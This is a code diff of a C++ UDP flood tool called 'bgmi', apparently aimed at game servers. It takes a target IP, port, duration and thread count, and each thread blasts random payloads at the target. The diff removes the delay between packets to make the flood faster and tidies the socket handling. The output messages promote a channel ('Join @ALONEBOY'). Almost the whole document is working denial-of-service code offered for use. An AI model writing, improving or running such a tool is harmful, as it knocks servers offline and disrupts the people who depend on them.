@@ -2,73 +2,81 @@
 #include <cstdlib>
 #include <cstring>
 #include <arpa/inet.h>
-#include <pthread.h>
-#include <ctime>
-#include <csignal>
+#include <thread>
 #include <vector>
 #include <memory>
 #include <random>
-#include <thread>
-#include <atomic>
-#include <chrono> // For std::chrono
+#include <csignal>
+#include <unistd.h>
 
-#define PAYLOAD_SIZE 20 // Define payload size
+#define PAYLOAD_SIZE 20
 
-// Attack class that encapsulates the attack logic
+// RAII class for handling UDP socket creation and closure
+class UDPSocket {
+public:
+    UDPSocket() {
+        sock_ = socket(AF_INET, SOCK_DGRAM, 0);
+        if (sock_ < 0) {
+            throw std::runtime_error("Socket creation failed");
+        }
+    }
+
+    ~UDPSocket() {
+        if (sock_ >= 0) {
+            close(sock_);
+        }
+    }
+
+    int get() const { return sock_; }
+
+private:
+    int sock_;
+};
+
+// Class for attack details: target IP, port, duration, and payload generation
 class Attack {
 public:
     Attack(const std::string& ip, int port, int duration)
         : ip(ip), port(port), duration(duration) {}
 
-    // Generate random payload for the attack
-    void generate_payload(char *buffer, size_t size) {
-        // Secure random number generator using C++11's random library
+    void generate_payload(char* buffer, size_t size) {
         std::random_device rd;
-        std::mt19937 gen(rd());
         std::uniform_int_distribution<int> dist(0, 15);
-
+        
         for (size_t i = 0; i < size; i++) {
             buffer[i * 4] = '\\';
             buffer[i * 4 + 1] = 'x';
-            buffer[i * 4 + 2] = "0123456789abcdef"[dist(gen)];
-            buffer[i * 4 + 3] = "0123456789abcdef"[dist(gen)];
+            buffer[i * 4 + 2] = "0123456789abcdef"[dist(rd)];
+            buffer[i * 4 + 3] = "0123456789abcdef"[dist(rd)];
         }
         buffer[size * 4] = '\0';
     }
 
-    // Perform the attack for the given duration
     void attack_thread() {
-        int sock;
-        struct sockaddr_in server_addr;
-        time_t endtime;
+        try {
+            UDPSocket sock;
+            struct sockaddr_in server_addr;
+            time_t endtime;
 
-        char payload[PAYLOAD_SIZE * 4 + 1]; // Buffer to hold the payload
-        generate_payload(payload, PAYLOAD_SIZE);
+            char payload[PAYLOAD_SIZE * 4 + 1];
+            generate_payload(payload, PAYLOAD_SIZE);
 
-        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
-            perror("Socket creation failed");
-            return;
-        }
+            memset(&server_addr, 0, sizeof(server_addr));
+            server_addr.sin_family = AF_INET;
+            server_addr.sin_port = htons(port);
+            server_addr.sin_addr.s_addr = inet_addr(ip.c_str());
 
-        memset(&server_addr, 0, sizeof(server_addr));
-        server_addr.sin_family = AF_INET;
-        server_addr.sin_port = htons(port);
-        server_addr.sin_addr.s_addr = inet_addr(ip.c_str());
-
-        endtime = time(NULL) + duration;
-        ssize_t payload_size = strlen(payload);
-        
-        // Keep sending packets until the attack duration expires
-        while (time(NULL) <= endtime) {
-            if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-                perror("Send failed");
-                close(sock);
-                return;
+            endtime = time(NULL) + duration;
+            while (time(NULL) <= endtime) {
+                ssize_t payload_size = strlen(payload);
+                if (sendto(sock.get(), payload, payload_size, 0, (const struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+                    perror("Send failed");
+                    return;
+                }
             }
-            std::this_thread::sleep_for(std::chrono::milliseconds(10)); // Sleep for 10ms
+        } catch (const std::exception& e) {
+            std::cerr << "Error in attack thread: " << e.what() << std::endl;
         }
-
-        close(sock);
     }
 
 private:
@@ -77,56 +85,52 @@ private:
     int duration;
 };
 
-// Global flag to stop the attack gracefully on SIGINT (Ctrl+C)
-std::atomic<bool> stop_attack(false);
-
+// Signal handler for graceful shutdown on SIGINT
 void handle_sigint(int sig) {
     std::cout << "\nStopping attack...\n";
-    stop_attack = true;
+    exit(0);
 }
 
-// Function to handle each attack thread
-void attack_task(std::shared_ptr<Attack> attack) {
-    while (!stop_attack) {
-        attack->attack_thread();
-    }
-}
-
+// Display usage instructions if incorrect arguments are passed
 void usage() {
-    std::cout << "Usage: ./BGMI ip port duration threads\n";
+    std::cout << "Usage: ./bgmi <ip> <port> <duration> <threads>\n";
     exit(1);
 }
 
-int main(int argc, char *argv[]) {
+int main(int argc, char* argv[]) {
     if (argc != 5) {
         usage();
     }
 
-    std::string ip = argv[1];      // Target IP address
-    int port = std::atoi(argv[2]); // Target port
-    int duration = std::atoi(argv[3]); // Duration for the attack (in seconds)
-    int threads = std::atoi(argv[4]);  // Number of attack threads
+    std::string ip = argv[1];
+    int port = std::atoi(argv[2]);
+    int duration = std::atoi(argv[3]);
+    int threads = std::atoi(argv[4]);
 
-    // Signal handling for graceful shutdown
+    // Catching SIGINT (Ctrl+C) for graceful termination
     std::signal(SIGINT, handle_sigint);
 
-    // Vector to store the thread pool
     std::vector<std::thread> thread_pool;
+    std::vector<std::unique_ptr<Attack>> attacks;
+
     std::cout << "Attack started on " << ip << ":" << port << " for " << duration << " seconds with " << threads << " threads\n";
 
-    // Launch the attack threads
+    // Create attack threads
     for (int i = 0; i < threads; i++) {
-        auto attack = std::make_shared<Attack>(ip, port, duration);
-        thread_pool.push_back(std::thread(attack_task, attack));
+        attacks.push_back(std::make_unique<Attack>(ip, port, duration));
+        thread_pool.push_back(std::thread([attack = attacks[i].get()]() {
+            attack->attack_thread();
+        }));
+        std::cout << "Launched thread " << i + 1 << "\n";
     }
 
-    // Wait for threads to finish
+    // Wait for all threads to finish
     for (auto& t : thread_pool) {
         if (t.joinable()) {
             t.join();
         }
     }
 
-    std::cout << "Attack finished. Join @GODxAloneBOY\n";
+    std::cout << "Attack finished. Join @ALONEBOY\n";
     return 0;
 }
